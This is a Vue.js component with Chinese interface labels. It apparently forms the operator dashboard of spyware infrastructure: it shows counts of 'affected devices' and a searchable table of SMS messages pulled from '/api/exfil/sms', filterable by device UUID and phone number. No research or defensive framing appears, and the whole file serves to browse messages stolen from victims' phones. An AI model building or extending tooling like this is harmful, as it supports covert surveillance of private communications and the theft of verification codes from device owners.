<template>
  <div class="sms">
    <!-- 统计卡片 -->
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Message /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.by_category?.sms || 0 }}</div>
              <div class="stat-label">短信总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.devices || 0 }}</div>
              <div class="stat-label">受影响设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><ArrowDown /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ receivedCount }}</div>
              <div class="stat-label">接收</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><ArrowUp /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ sentCount }}</div>
              <div class="stat-label">发送</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- 操作工具栏 -->
    <el-card>
      <div class="toolbar">
        <div class="search-bar">
          <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
          <el-input v-model="filters.phone" placeholder="号码" style="width: 150px;" />
          <el-select v-model="filters.type" placeholder="类型">
            <el-option label="全部" value="" />
            <el-option label="接收" value="received" />
            <el-option label="发送" value="sent" />
          </el-select>
          <el-button type="primary" @click="loadSMS">查询</el-button>
          <el-button @click="resetFilters">重置</el-button>
        </div>
      </div>
      
      <el-table :data="smsData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" show-overflow-tooltip />
        <el-table-column prop="phone" label="号码" />
        <el-table-column prop="content" label="内容" show-overflow-tooltip />
        <el-table-column prop="type" label="类型" width="100">
          <template #default="scope">
            <el-tag :type="scope.row.type === 'received' ? 'info' : 'success'">{{ scope.row.type === 'received' ? '接收' : '发送' }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="时间" width="180" />
        <el-table-column label="操作" width="100">
          <template #default="scope">
            <el-button size="small" type="danger" @click="deleteItem(scope.row.id)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, computed } from 'vue'
import axios from '../utils/axios'
import { Message, Iphone, ArrowDown, ArrowUp } from '@element-plus/icons-vue'

const smsData = ref([])
const loading = ref(false)
const stats = ref({})

const filters = reactive({
  device_uuid: '',
  phone: '',
  type: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

const receivedCount = computed(() => smsData.value.filter(item => item.type === 'received').length)
const sentCount = computed(() => smsData.value.filter(item => item.type === 'sent').length)

async function loadStats() {
  try {
    const response = await axios.get('/api/exfil/stats')
    stats.value = response.data
  } catch (error) {
    console.error('加载统计失败:', error)
  }
}

async function loadSMS() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.phone) params.append('phone', filters.phone)
    if (filters.type) params.append('type', filters.type)
    
    const response = await axios.get(`/api/exfil/sms?${params}`)
    smsData.value = response.data
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function deleteItem(id) {
  if (!confirm('确定要删除这条记录吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadSMS()
    loadStats()
  } catch (error) {
    console.error('删除失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.phone = ''
  filters.type = ''
  loadSMS()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadSMS()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadSMS()
}

onMounted(() => {
  loadStats()
  loadSMS()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.toolbar {
  margin-bottom: 15px;
}

.search-bar {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}
</style>